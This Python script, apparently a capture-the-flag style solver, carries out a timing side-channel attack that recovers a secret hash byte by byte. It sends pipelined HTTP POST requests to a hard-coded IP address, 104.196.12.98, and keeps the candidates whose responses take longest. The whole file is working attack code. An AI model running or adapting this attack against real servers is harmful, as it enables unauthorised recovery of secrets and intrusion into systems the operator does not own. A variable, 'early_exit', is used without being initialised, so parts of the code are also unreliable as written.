import hashlib
import io
import sys
import socket
import time

def build_pipeline(host, duplicates=8, path="/", data=None, method=None, initial_data=None):
    method = method or ("GET" if data is None else "POST")

    pipeline = ""
    request_count = duplicates + (1 if initial_data is not None else 0)
    for x in range(request_count):
        _data = data
        if x == 0 and initial_data is not None:
            _data = initial_data
        pipeline += "{method} {path} HTTP/1.1\n".format(method=method, path=path)
        pipeline += "Host: {host}\n".format(host=host)
        pipeline += "Connection: {}\n".format("Close" if x == request_count - 1 else "Keep-Alive")
        if data is not None:
            pipeline += "Content-Length: {}\n".format(len(_data))
            pipeline += "Content-Type: application/x-www-form-urlencoded\n"
        pipeline += "\n"
        if _data is not None:
            pipeline += _data
    return pipeline, request_count

def send_request_pipeline(pipeline, response_length=734, request_count=8):
    pipeline = pipeline.encode()
    data = io.BytesIO()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect(("104.196.12.98", 80))
        connection_time = time.time()
        # s.connect(("127.0.0.1", 8000))
        s.sendall(pipeline)
        send_time = time.time()

        for y in range(request_count):
            data.write(s.recv(response_length))
            if y == 0:
                afterreceive_time = time.time()
        finish_time = time.time()
        connection_time = finish_time - connection_time
        send_time = finish_time - send_time
        afterreceive_time = finish_time - afterreceive_time
    return connection_time, send_time, afterreceive_time, recv_request_pipeline(data, request_count)

def recv_request_pipeline(data, response_count):
    data.seek(0)

    responses = []
    for x in range(response_count):
        http_header = data.readline()
        if not http_header.startswith(b'HTTP/'):
            raise Exception("Bad HTTP header '{}'".format(http_header))
        status_code = int(http_header.split(b' ')[1])

        headers = {}
        while True:
            header = data.readline()
            if header == b'\r\n':
                break
            header, value = header.decode().split(": ")
            headers[header] = value

        if not "Content-Length" in headers:
            raise Exception("No Content-Length in headers '{}'".format(repr(headers)))
        body = data.read(int(headers["Content-Length"]))
        responses.append((status_code, headers, body))
    return responses


hash = sys.argv[1] if len(sys.argv) > 1 else ""
for index in range(int(len(hash) / 2), 32):
    expected_fail = (0.5 * ((len(hash) / 2) + 1))
    early_exit_min = (0.5 * ((len(hash) / 2) + 2))
    early_exit_max = (0.5 * ((len(hash) / 2) + 3))
    print(expected_fail, early_exit_min, early_exit_max)
    starttime = time.time()
    print("Starting timing attack on byte {} with hash='{}'".format(index, hash))

    bad_count = 0
    inputs = list(range(256))

    while len(inputs) > 1:
        results = []
        for hashbyte in inputs:
            _hash = hash + ("{:02x}".format(hashbyte) * (32 - index))
            pipeline, request_count = build_pipeline("104.196.12.98", data="hash={}".format(_hash), duplicates=1, initial_data="hash=1")
            result = send_request_pipeline(pipeline, response_length=739, request_count=request_count)

            t1, t2, t3, responses = result
            status_code, headers, body = responses[-1]
            print("{}: {:<20} {:<20} {:<20} - {} : {}".format(_hash, t1, t2, t3, status_code, hashlib.sha256(body).hexdigest()))
            results.append((hashbyte, *result))

            # Check if we should fail the last result
            if result[2] < expected_fail:
                bad_count += 1
                print("[WARNING] I think something may have gone wrong")
                if bad_count == 5:
                    hash = hash[:-1]
                    early_exit = True
                    break

            # Check
            if result[2] > early_exit_min and result[2] < early_exit_max:
                duplicates = 4
                pipeline, request_count = build_pipeline("104.196.12.98", data="hash={}".format(_hash), duplicates=duplicates, initial_data="hash=1")
                result = send_request_pipeline(pipeline, response_length=739, request_count=request_count)
                if result[2] > early_exit_min * duplicates and result[2] < early_exit_max * duplicates:
                    print("[!] Early find of result {}".format(hashbyte))
                    print("{}: {:<20} {:<20} {:<20}".format(_hash, *result))
                    early_exit = True
                    hash += "{:02x}".format(hashbyte)
                    break
        if early_exit:
            break

        # Reduce imputs to the top quater of those that took the longest
        inputs = [x[0] for x in sorted(results, key=lambda x: x[3])[-1 * int(len(inputs) / 4):]]

    if early_exit:
        continue

    # If we get here the input won by elimination
    hash += "{:02x}".format(inputs[0])
